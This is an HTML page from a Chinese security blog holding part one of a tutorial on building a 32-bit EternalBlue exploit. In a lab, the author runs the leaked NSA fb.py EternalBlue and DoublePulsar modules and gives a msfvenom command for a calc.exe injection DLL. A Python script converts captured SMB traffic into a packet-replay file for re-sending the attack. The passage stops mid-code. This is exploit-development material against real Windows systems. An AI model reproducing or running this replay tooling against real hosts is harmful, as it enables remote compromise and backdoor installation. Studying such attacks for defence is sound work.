<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】EternalBlue之32位exploit编写(一) - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="EternalBlue,永恒之蓝,exploit"/>
    
        <meta name="description" content="今天我们着重从协议上分析一下eternalblue的攻击的数据流，然后试着重放这些数据。
"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】EternalBlue之32位exploit编写(一)</h2>
                <div class="article-msg">
                    <span class="time">2017-06-22 13:58:36</span>
                    
                                        <span class="read">阅读：20080次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_4012"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="4012" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2554610746" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t013b8968339a7b809d.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2554610746" style="color:#848e99;">東</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-align: center; text-indent: 0em;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);"><img src="http://p7.qhimg.com/t019bc1ce206dcd6b75.png" title="t010c5b8ba2dec4b95c.png" alt="http://p2.qhimg.com/t010c5b8ba2dec4b95c.png"/></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=2554610746" target="_blank" style="text-decoration: none;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">東</span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">预估</span><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">稿</span><span style="font-weight: 900;"><span style="font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">费：400RMB</span></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; text-indent: 32px; background: white;"><span style="font-weight: 900;"><span style="font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">投稿方式：发送邮件至linwei#360.cn</span></span><span style="font-weight: 900;"><span style="font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">，或登陆网页版在线投稿</span></span></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">距离shadowbrokers团队放出NSA的这批黑客工具也有两月之久了,其中的一个名叫&quot;永恒之蓝&quot;的漏洞模块被疯狂地在野外利用,相信网友们如果没有经历过WannaCry&nbsp;勒索软件的淫威,重视度可能也远不如之前刚放出来时,任何人都可以用着fuzzbunch这个工具集成模块去攻击别人,fb.py这个集合了他子目录下的一些exploit被热心网友们玩的不亦乐乎的同时,地下的自由职业者也忙的不可开交各类变种勒索软件不断涌现,当然今天主角也不是勒索软件,今天我们着重从协议上分析一下<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);"><strong>eternalblue的攻击的数据流</strong></span>，然后试着重放这些数据。</span></p><p style="text-indent: 2em;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">实验环境</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">网络环境:局域网</span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">攻击ip:192.168.157.129(win7_x86)</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">靶机ip:192.168.157.131(win7_x86)</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">工具:NSA的fb.py、wireshark、python、hex editor、</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong>实验步骤</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一步:使用fb.py中的eternalblue模块走一遍正常攻击流程&nbsp;开wireshark把攻击过程的数据截获</span><br/></strong></span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p4.qhimg.com/t01202b99e7e3cd2eeb.png" title="t01e5a96c7d7531f420.png" alt="http://p4.qhimg.com/t01e5a96c7d7531f420.png" width="1200" height="736" style="height: 736px;"/><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接着我们就轻车熟路的打开了shadowbrokers的fb.py 去攻击192.168.157.129 攻击过程我就不阐述了 网上很多参考 攻击完毕回头就看下wireshark捕捉到的SMB数据包</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p5.qhimg.com/t015790e48bbec5fc82.png" title="t0109ea7d857041797c.png" alt="http://p4.qhimg.com/t0109ea7d857041797c.png" width="1200" height="605" style="height: 605px;"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里用到的Eternalblue模块这个模块 在这个模块执行之前是没有数据的,执行之后wireshark捕捉到了数据</span></p><p style="text-indent: 0em; text-align: center;"><img src="http://p8.qhimg.com/t01aa5fca334f3ee617.png" title="t0181af598823381ef5.png" alt="http://p5.qhimg.com/t0181af598823381ef5.png" width="1200" height="688" style="height: 688px;"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个说白了就是个利用Eternalblue利用漏洞安装后门的一个过程,接着重新捕获数据 我们使用Doublepulsar这个模块,这模块功能定义上类似于meterprete而前面的则属于exploit模块吧</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p3.qhimg.com/t012140e4416908f65c.png" title="t01377304d0eccc461d.png" alt="http://p8.qhimg.com/t01377304d0eccc461d.png" width="1200" height="749" style="height: 749px;"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">msfvenom -p windows/exec CMD=&quot;calc.exe&quot; -f dll &gt; /test.dll这样生成就可以,上面我用Doublepuls注入的dll是用msf生的 注入的进程我选择了资源管理器的&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这次的数据包明显比上一个少了很多。接着我们着重分析这两个流内的数据。</span></p><p style="text-indent: 2em;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二步:分析fb.py动作产生的数据流</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们先来看一下SMB协议的定义&nbsp;</span></p><pre class="brush:bash;toolbar:false">//&nbsp;8&nbsp;unsigned&nbsp;bits
typedef&nbsp;unsigned&nbsp;short&nbsp;USHORT;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;16&nbsp;unsigned&nbsp;bits
typedef&nbsp;unsigned&nbsp;long&nbsp;ULONG;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;32&nbsp;unsigned&nbsp;bits
typedef&nbsp;struct&nbsp;{
&nbsp;&nbsp;&nbsp;ULONG&nbsp;LowPart;
&nbsp;&nbsp;&nbsp;LONG&nbsp;HighPart;
}&nbsp;LARGE_INTEGER;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;64&nbsp;bits&nbsp;of&nbsp;data
typedef&nbsp;struct&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;UCHAR&nbsp;Protocol[4];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Contains&nbsp;0xFF,&#39;SMB&#39;
&nbsp;&nbsp;&nbsp;UCHAR&nbsp;Command;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Command&nbsp;code
&nbsp;&nbsp;&nbsp;union&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UCHAR&nbsp;ErrorClass;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Error&nbsp;class
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UCHAR&nbsp;Reserved;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Reserved&nbsp;for&nbsp;future&nbsp;use
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;Error;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Error&nbsp;code
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;DosError;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;Status;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;32-bit&nbsp;error&nbsp;code
&nbsp;&nbsp;&nbsp;}&nbsp;Status;
&nbsp;&nbsp;&nbsp;UCHAR&nbsp;Flags;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Flags
&nbsp;&nbsp;&nbsp;USHORT&nbsp;Flags2;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;More&nbsp;flags
&nbsp;&nbsp;&nbsp;union&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;Pad[6];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Ensure&nbsp;section&nbsp;is&nbsp;12&nbsp;by
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;PidHigh;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;High&nbsp;Part&nbsp;of&nbsp;PID
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UCHAR&nbsp;SecuritySignature[8];&nbsp;&nbsp;&nbsp;//&nbsp;reserved&nbsp;for&nbsp;MAC
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;Extra;
&nbsp;&nbsp;&nbsp;};
&nbsp;&nbsp;&nbsp;USHORT&nbsp;Tid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Tree&nbsp;identifier
&nbsp;&nbsp;&nbsp;USHORT&nbsp;Pid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Caller’s&nbsp;process&nbsp;ID,&nbsp;opaque&nbsp;for
client&nbsp;use
&nbsp;&nbsp;&nbsp;USHORT&nbsp;Uid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;User&nbsp;id
&nbsp;&nbsp;&nbsp;USHORT&nbsp;Mid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;multiplex&nbsp;id
&nbsp;&nbsp;&nbsp;UCHAR&nbsp;&nbsp;WordCount;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Count&nbsp;of&nbsp;parameter&nbsp;words
}&nbsp;SMB_HEADER;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">接着再看下eternalblue数据包中的数据流 这么多的会话 我用脚本把他们生成了可替换的数据字节并保存起来</span></p><p style="text-indent: 0em; text-align: center;"><img src="http://p0.qhimg.com/t01a6960db68f044fad.png" title="t014087c31e3e9941a3.png" alt="http://p6.qhimg.com/t014087c31e3e9941a3.png" width="1200" height="618" style="height: 618px;"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">win7后门安装的数据流已经有人在github上公开了,方法大同小异吧 follow stream 其实要紧的是能把这步自动化才是极好的 二十多个流自己去follow眼睛恐怕要累瞎,写了个不太完善的脚本</span></p><pre class="brush:bash;toolbar:false">import&nbsp;binascii
import&nbsp;struct
pcap_file&nbsp;=&nbsp;&quot;smb3.pcap&quot;
output_file&nbsp;=&nbsp;&quot;BackdoorInstall.replay&quot;
def&nbsp;wf(filename,data):
fp=open(filename,&quot;wb&quot;)
fp.write(data)
fp.close()
def&nbsp;rf(filename):
fp=open(filename,&quot;rb&quot;)
data=fp.read()
fp.close()
return&nbsp;data
#&nbsp;分析数据包
def&nbsp;anlyse(all_data):
data_len&nbsp;=&nbsp;len(all_data)
ncount&nbsp;=&nbsp;0
now_index&nbsp;=&nbsp;40&nbsp;#pcap&nbsp;24,间隔&nbsp;16，protoheader&nbsp;54,&nbsp;tcp+ipheader&nbsp;20+20
array&nbsp;=&nbsp;[]
while&nbsp;now_index&nbsp;&lt;&nbsp;data_len:
one_len&nbsp;=&nbsp;struct.unpack(&quot;&gt;H&quot;,all_data[now_index+16:now_index+18])[0]&nbsp;-40
if(all_data[now_index+34:now_index+36]&nbsp;!=&nbsp;&quot;\x01\xbd&quot;):#不是445表示发送端
data_temp&nbsp;=&nbsp;&quot;&quot;
array_temp&nbsp;=&nbsp;all_data[now_index+54:now_index&nbsp;+54+one_len]
for&nbsp;i&nbsp;in&nbsp;range(one_len):
data_temp&nbsp;=&nbsp;data_temp&nbsp;+&nbsp;&quot;\\x&quot;&nbsp;+&nbsp;binascii.b2a_hex(array_temp[i])
array.append(&quot;(&#39;send&#39;,1,b&#39;&quot;&nbsp;+&nbsp;data_temp&nbsp;+&nbsp;&quot;&#39;,0.01)\r\n\r\n&quot;)
else:
array.append(&quot;(&#39;recv&#39;,&nbsp;1,&nbsp;0.01)\r\n\r\n&quot;)
now_index&nbsp;=&nbsp;now_index&nbsp;+&nbsp;one_len&nbsp;+&nbsp;16&nbsp;+&nbsp;54
ncount&nbsp;+=&nbsp;1
print&nbsp;ncount,&quot;:&quot;,one_len
return&nbsp;array,ncount
if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:
array&nbsp;,&nbsp;ncount&nbsp;=&nbsp;anlyse(rf(pcap_file))
data_replay&nbsp;=&nbsp;&quot;(&#39;connect&#39;,&nbsp;1,&nbsp;0.01)\r\n\r\n&quot;
data_replay2&nbsp;=&nbsp;data_replay
j&nbsp;=&nbsp;1
for&nbsp;i&nbsp;in&nbsp;range(ncount):
data_replay&nbsp;+=&nbsp;array[i]
if(array[i].find(&quot;send&quot;)&nbsp;!=&nbsp;-1):#如果是send
data_replay2&nbsp;=&nbsp;data_replay2&nbsp;+&nbsp;&quot;#&quot;&nbsp;+&nbsp;str(j)&nbsp;+&nbsp;array[i]
j&nbsp;+=&nbsp;1
else:
data_replay2&nbsp;+=&nbsp;array[i]
data_replay&nbsp;+=&nbsp;&quot;(&#39;close&#39;,&nbsp;1,&nbsp;0.01)&quot;
data_replay2&nbsp;+=&nbsp;&quot;(&#39;close&#39;,&nbsp;1,&nbsp;0.01)&quot;
wf(output_file,data_replay)
wf(output_file+&quot;.listrec&quot;,data_replay2)#这个是记录send顺序的文件
print&nbsp;&quot;over!&quot;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><p style="margin: 5px 0px; text-indent: 2em;"><strong><span style="font-size:16px;font-family:&#39;微软雅黑&#39;,&#39;sans-serif&#39;;color:#E36C09">第三步:分析Doublepulsar注入动作产生的数据流并提取</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">接下来分析Doublepulsar的apc注入部分 可以看到七个SMB的request,接着就去搞清其中字段的含义,在我们不知道他每个字段都是什么意思的前提下我们就不用去改他,不是说一点不改,最起码的SMB head length这些基本数据包的知识我们知道了就可以去修改,怎么检测自己的手动发的数据包是否和NSA工具发的包一样呢?一共是7个包对应七个请求,用python发包,然后recv回来的数据和我们用wireshark抓到工具复现的包相同就说明自己包没问题然后接着去发下一条请求再去判断。</span><br/><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;"></span></p><pre class="brush:bash;toolbar:false">#smb&nbsp;头是32字节&nbsp;请求包50字节&nbsp;以下一行30字节&nbsp;smb版本
